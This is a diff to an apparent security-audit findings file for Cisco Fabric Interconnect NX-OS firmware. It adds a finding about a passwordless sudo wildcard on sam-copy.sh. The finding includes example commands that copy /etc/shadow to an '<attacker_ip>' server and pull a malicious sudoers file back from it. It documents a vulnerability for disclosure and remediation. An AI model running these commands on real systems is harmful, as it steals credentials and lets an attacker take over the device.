@@ -273,7 +273,50 @@ FI6500_F7 = {
     "applies_to": ["FI 6400 (FI64XX-F1 — identical binary)", "FI 6500", "FI 6600 (FI64XX-F1 — identical binary)"],
 }
 
-FINDINGS = [FI6500_F1, FI6500_F2, FI6500_F3, FI6500_F4, FI6500_F5, FI6500_F6, FI6500_F7]
+# ─────────────────────────────────────────────────────────
+# FI6500-F8 — NOPASSWD sam-copy.sh wildcard — arbitrary file exfiltration/import via SCP/FTP/TFTP
+# ─────────────────────────────────────────────────────────
+FI6500_F8 = {
+    "id":       "FI6500-F8",
+    "title":    "sudoers NOPASSWD for /isan/bin/sam-copy.sh with wildcard args in management netns — any authenticated user can exfiltrate or overwrite arbitrary FI files via SCP/SFTP/FTP/TFTP",
+    "status":   "CONFIRMED — /etc/sudoers + /isan/bin/sam-copy.sh in FI6400 NX-OS rootfs (applies to FI6400/6500/6600)",
+    "severity": "HIGH",
+
+    "sudoers_entry": (
+        "Cmnd_Alias INITIAL_SETUP_GUI_CMNDS = \\\n"
+        "    ...,\n"
+        "    /sbin/ip netns exec management /isan/bin/sam-copy.sh *\n"
+        "ALL,!root,!admin ALL = NOPASSWD:...,NOPASSWD:INITIAL_SETUP_GUI_CMNDS"
+    ),
+
+    "sam_copy_usage": (
+        "sam-copy.sh <protocol> <copyout|copyin> <server> <localfile> <remotefile> <user> [<passwd>]\n"
+        "Protocols: scp, sftp, ftp, tftp\n"
+        "Implemented as an Expect script wrapping scp/sftp/ftp/busyboxsam tftp.\n"
+        "localfile and remotefile accept arbitrary paths."
+    ),
+
+    "exfiltration_example": (
+        "sudo /sbin/ip netns exec management /isan/bin/sam-copy.sh scp copyout "
+        "<attacker_ip> /etc/shadow /tmp/shadow admin <pass>\n"
+        "Copies /etc/shadow to attacker-controlled server via SCP from the management network namespace. "
+        "The password is a required positional arg (argv[6]) and visible in process table — "
+        "combined with FI6500-F1 (NOPASSWD strings /proc/*/environ), "
+        "the password is also readable from the sam-copy.sh process environment."
+    ),
+
+    "import_example": (
+        "sudo /sbin/ip netns exec management /isan/bin/sam-copy.sh scp copyin "
+        "<attacker_ip> /etc/sudoers /tmp/sudoers_evil admin <pass>\n"
+        "If /etc/sudoers is writable after import, or if any other config file "
+        "under /isan/, /etc/, or /opt/ is writable, arbitrary content can be injected."
+    ),
+
+    "scope": "Any authenticated NX-OS user with access to the host Linux layer. No admin or root required.",
+    "applies_to": ["FI 6400 (confirmed)", "FI 6500 (FI64XX-F1 — identical binary)", "FI 6600 (FI64XX-F1)"],
+}
+
+FINDINGS = [FI6500_F1, FI6500_F2, FI6500_F3, FI6500_F4, FI6500_F5, FI6500_F6, FI6500_F7, FI6500_F8]
 
 if __name__ == "__main__":
     for f in FINDINGS:
